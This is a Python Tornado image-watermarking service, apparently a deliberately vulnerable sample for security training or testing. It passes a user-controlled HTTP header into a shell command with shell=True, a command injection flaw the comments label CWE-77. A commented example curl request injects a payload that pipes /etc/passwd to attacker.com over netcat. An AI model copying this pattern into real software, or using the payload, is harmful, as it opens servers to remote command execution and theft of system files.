import tornado.ioloop
import tornado.web
import os
import sqlite3
import subprocess
import logging
import uuid
from datetime import datetime

# Configure logging for the Media Processing API
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s - MediaService - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TornadoWatermarkAPI")

DB_FILE = "asset_management.db"
UPLOAD_DIR = "/tmp/assets"

def initialize_database():
    """Initializes the SQLite database to track processed image assets."""
    if os.path.exists(DB_FILE):
        return
        
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE processed_assets (
            asset_id TEXT PRIMARY KEY,
            original_filename TEXT NOT NULL,
            watermark_applied TEXT,
            status TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("Asset management database initialized.")

def log_asset_processing(asset_id: str, filename: str, watermark: str, status: str):
    """Records the outcome of an image processing job."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO processed_assets (asset_id, original_filename, watermark_applied, status) VALUES (?, ?, ?, ?)",
        (asset_id, filename, watermark, status)
    )
    conn.commit()
    conn.close()

def apply_watermark_overlay(input_path: str, output_path: str, watermark_text: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: Custom HTTP Header (X-Watermark-Text) extracted via Tornado RequestHandler
    """
    logger.info(f"Applying watermark overlay to {input_path}")
    
    # Vulnerability: Direct string concatenation of the HTTP Header value into a shell command.
    # The 'watermark_text' variable is completely controlled by the user and not sanitized.
    command = f'convert "{input_path}" -gravity South -pointsize 36 -fill white -annotate 0 "{watermark_text}" "{output_path}"'
    
    try:
        logger.debug(f"Executing ImageMagick command: {command}")
        
        # shell=True allows the execution of shell metacharacters (e.g., ;, &&, |)
        # An attacker can break out of the double quotes to execute arbitrary OS commands.
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=15)
        
        if process.returncode == 0:
            logger.info("Watermark applied successfully.")
            return True, stdout
        else:
            logger.error(f"ImageMagick failed: {stderr}")
            # Leaking stderr back to the caller can expose command injection output
            return False, stderr
            
    except subprocess.TimeoutExpired:
        logger.error("Image processing timed out.")
        return False, "Process timeout exceeded 15 seconds."
    except Exception as e:
        logger.error(f"System error during image processing: {e}")
        return False, str(e)

class WatermarkHandler(tornado.web.RequestHandler):
    """Handles POST requests to upload an image and apply a text watermark."""
    
    def post(self):
        # 1. Extract the trigger payload from the custom HTTP Header
        # If the header is not provided, defaults to "Confidential"
        watermark_text = self.request.headers.get("X-Watermark-Text", "Confidential")
        
        if 'image' not in self.request.files:
            self.set_status(400)
            self.write({"error": "No 'image' file provided in the multipart form data."})
            return
            
        file_info = self.request.files['image'][0]
        original_filename = file_info['filename']
        
        asset_id = str(uuid.uuid4())
        input_filepath = os.path.join(UPLOAD_DIR, f"{asset_id}_in.jpg")
        output_filepath = os.path.join(UPLOAD_DIR, f"{asset_id}_out.jpg")
        
        # Save the uploaded file temporarily
        with open(input_filepath, 'wb') as f:
            f.write(file_info['body'])
            
        # 2. Pass the untrusted header value to the vulnerable processing function
        success, message = apply_watermark_overlay(input_filepath, output_filepath, watermark_text)
        
        if success:
            log_asset_processing(asset_id, original_filename, watermark_text, "SUCCESS")
            self.write({
                "status": "success",
                "asset_id": asset_id,
                "message": "Image processed successfully.",
                "download_url": f"/api/v1/download/{asset_id}_out.jpg"
            })
        else:
            log_asset_processing(asset_id, original_filename, watermark_text, "FAILED")
            self.set_status(500)
            # Returning the raw error message directly in the HTTP response
            self.write({
                "error": "Image processing failed", 
                "details": message
            })
            
        # Cleanup input file
        if os.path.exists(input_filepath):
            os.remove(input_filepath)

def make_app():
    """Configures the Tornado web application routes."""
    if not os.path.exists(UPLOAD_DIR):
        os.makedirs(UPLOAD_DIR)
        
    return tornado.web.Application([
        (r"/api/v1/watermark", WatermarkHandler),
    ])

if __name__ == "__main__":
    # Example Malicious cURL Request exploiting the HTTP Header:
    # curl -X POST http://127.0.0.1:8888/api/v1/watermark \
    #      -H 'X-Watermark-Text: "; cat /etc/passwd | nc attacker.com 4444; #"' \
    #      -F "image=@sample.jpg"
    
    initialize_database()
    app = make_app()
    app.listen(8888)
    logger.info("Tornado Image Service listening on http://127.0.0.1:8888")
    
    try:
        tornado.ioloop.IOLoop.current().start()
    except KeyboardInterrupt:
        logger.info("Shutting down Tornado Image Service.")
